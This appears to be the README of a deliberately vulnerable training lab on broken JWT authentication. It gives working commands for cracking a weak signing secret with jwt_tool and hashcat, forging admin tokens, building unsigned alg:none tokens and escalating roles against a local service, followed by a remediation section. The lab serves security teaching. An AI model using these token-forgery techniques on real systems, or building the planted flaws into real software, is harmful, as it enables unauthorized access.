# Lab 06 — Broken Authentication: JWT Attacks 🔴

**Port:** `8006`  
**Stack:** Node.js + PostgreSQL  
**Difficulty:** Intermediate

---

## 🕳️ Security Loopholes

1. **Weak JWT Secret** — `secret123` is trivially crackable with hashcat/jwt_tool
2. **Algorithm Confusion (none)** — Server accepts `alg:none`, allowing unsigned token forgery
3. **Role Claim Forgery** — The `role` field is read from JWT payload without DB verification
4. **Fallback `jwt.decode()`** — Server falls back to unverified decode on verify failure

---

## 🎯 Attack Scenarios

### Scenario A — Crack the JWT Secret
```bash
docker compose up -d

# 1. Get a valid JWT
TOKEN=$(curl -s -X POST http://localhost:8006/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

echo "Token: $TOKEN"

# 2. Crack the secret with jwt_tool
pip install jwt_tool
jwt_tool $TOKEN -C -d /usr/share/wordlists/rockyou.txt

# 3. Or use hashcat
echo $TOKEN > jwt.txt
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# Result: secret123
```

### Scenario B — Forge Admin Token with Cracked Secret
```bash
# After cracking secret='secret123', forge an admin token
python3 -c "
import jwt, json
payload = {'id': 99, 'username': 'attacker', 'role': 'admin'}
token = jwt.encode(payload, 'secret123', algorithm='HS256')
print(token)
"

# Use forged admin token
ADMIN_TOKEN=<forged_token>
curl http://localhost:8006/admin/users -H "Authorization: Bearer $ADMIN_TOKEN"
curl http://localhost:8006/secrets -H "Authorization: Bearer $ADMIN_TOKEN"
```

### Scenario C — Algorithm None Attack
```bash
# Forge token with alg:none (no signature needed)
python3 -c "
import base64, json

header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({'id':1,'username':'admin','role':'admin'}).encode()).rstrip(b'=').decode()
token = f'{header}.{payload}.'  # Empty signature
print(token)
"

# Or use jwt_tool
jwt_tool $TOKEN -X a   # -X a = algorithm none attack
```

### Scenario D — Role Escalation
```bash
# Decode current token (base64), modify role, re-sign with cracked secret
python3 -c "
import jwt
token = jwt.decode('$TOKEN', 'secret123', algorithms=['HS256'])
token['role'] = 'admin'
new = jwt.encode(token, 'secret123', algorithm='HS256')
print(new)
"
```

---

## 🛠️ Tools

| Tool | Command |
|------|---------|
| `jwt_tool` | `jwt_tool <token> -C -d rockyou.txt` |
| `hashcat` | `hashcat -m 16500 jwt.txt wordlist.txt` |
| `python-jwt` | Manual token forge |
| Burp Suite JWT Editor | Visual token manipulation |

---

## 🔐 How to Fix

```javascript
// 1. Use a strong random secret (min 256-bit)
const SECRET = crypto.randomBytes(32).toString('hex'); // Store in env vault

// 2. Whitelist only HS256 — never allow 'none'
const decoded = jwt.verify(token, SECRET, { algorithms: ['HS256'] });

// 3. Always verify role against DB, not JWT claim
const userFromDB = await pool.query('SELECT role FROM users WHERE id = $1', [decoded.id]);
req.user.role = userFromDB.rows[0].role; // Trust DB, not token

// 4. Short expiry + token rotation
jwt.sign(payload, SECRET, { expiresIn: '15m' });
```
